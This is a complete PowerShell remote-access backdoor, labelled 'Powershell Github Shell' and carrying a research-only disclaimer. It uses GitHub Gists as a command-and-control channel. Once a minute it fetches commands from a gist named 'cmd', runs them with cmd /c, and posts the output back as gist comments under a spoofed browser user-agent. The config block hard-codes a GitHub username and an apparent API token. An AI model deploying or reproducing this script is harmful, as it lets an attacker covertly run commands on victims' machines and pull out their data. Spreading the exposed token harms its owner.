#Powershell Github Shell
#Author:zshell
#Blog:http://www.0x7c.com
#Github:https://github.com/zlocal/Powershell-Github-Shell
#仅限用于学习和研究目的；不得将上述内容用于商业或者非法用途，否则，一切后果请用户自负。
#Demo Result Gist:https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e

#Config Info####################################
$gistsUser="mikemcle";					# github user,change it to yourself`s
$gistsApiToken="6a34f0822547621838382cf1c6ea8e592356df8d";		# github gist api token,change it to yourself`s
$checkTime=02;		#check time for new command.
#Config Info####################################



function sendResult($r){
    try{
     $encodeResult=[System.Web.HttpUtility]::UrlEncode([system.String]::Join("`r`n",$r))
     
     $webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
     $r=$webclient.UploadString($cmdGist.comments_url,"{""body"":""$encodeResult""}")
     }catch{
	$encodeResult=[System.Web.HttpUtility]::UrlEncode([system.String]::Join("`r`n",$_))
	$webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
	$r=$webclient.UploadString($cmdGist.comments_url,"{""body"":""$encodeResult""}")
     }
    
}
function parseCommand($command){
     $jsonCommandStr="{"+$command+"}";
     try{
	#$jsonCommand=ConvertFrom-Json $jsonCommandStr;
	 [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions");
	$ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer;
	$jsonCommand = $ser.DeserializeObject($jsonCommandStr);
    }catch{
	sendResult("ERROR: $_");
    }
     if($jsonCommand -and $jsonCommand.Command.length -gt 0){
#	  echo ("Exe Cmd:"+$jsonCommand.Command);
	  $commandStr=$jsonCommand.Command;
	  if($commandStr){
	    $result = cmd /c ($commandStr+" 2>&1");
	    sendResult("Command Result for $commandStr :`r`n"+$result);
	  }
     }
     if($jsonCommand -and $jsonCommand.ReadFile.length -gt 0){
#	  echo ("Read File:"+$jsonCommand.ReadFile);
     }
     if($jsonCommand -and $jsonCommand.WriteFile.length	-gt 0){
#	  echo ("Write File:"+$jsonCommand.WriteFile);
     }
     if($jsonCommand -and $jsonCommand.Powershell.length -gt 0){
#	 echo ("Execute	Powershell:"+$jsonCommand.Powershell); 
     }
}


$oldCommand="";
$webclient=new-object System.Net.WebClient
#$webclient.Credentials=new-object System.Net.NetworkCredential($gistsUser,$gistsApiToken)
$upass=[System.Text.Encoding]::UTF8.GetBytes("${gistsUser}:${gistsApiToken}");
$authHeader="Basic "+[System.Convert]::ToBase64String($upass);
$webclient.Headers.Add("Authorization",$authHeader);
$webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

while(1){
  Start-Sleep -Seconds 60;

  $webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET	CLR 1.0.3705;)");
  $gists=$webclient.DownloadString('https://api.github.com/gists')
#  $jsonGists=ConvertFrom-Json $gists		#Only can be Used in Powershell Version 3.0 or Higher
	
  [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions");
  $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer;
  $jsonGists = $ser.DeserializeObject($gists);
 

  $cmdId=""
  $cmdGist={};
  foreach ($oneGist in $jsonGists){
	  if(($oneGist["files"].cmd ) -and ($oneGist["files"].cmd.filename -eq "cmd")){
	  $cmdId=$oneGist.id;
	  $cmdGist=$oneGist;
	  break;
	  }
  }

  $command="";
  if(($cmdId.length -gt	0) -and	($cmdGist.url.length -gt 0)){
  $webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET	CLR 1.0.3705;)");
  $cmdGistContent=$webclient.DownloadString($cmdGist.url);
  #$cmdGistDetail=ConvertFrom-Json $webclient.DownloadString($cmdGist.url);

  [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions");
  $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer;
  $cmdGistDetail = $ser.DeserializeObject($cmdGistContent);
	

  $command=$cmdGistDetail["files"].cmd.content;
  }
  if($command -and ($command -ne $oldCommand)){
  $commandList=$command.split("`n");
  foreach ($oneCommand in $commandList){
      #	Execute	Command
      parseCommand($oneCommand);
  }

  $oldCommand=$command;
  }
}
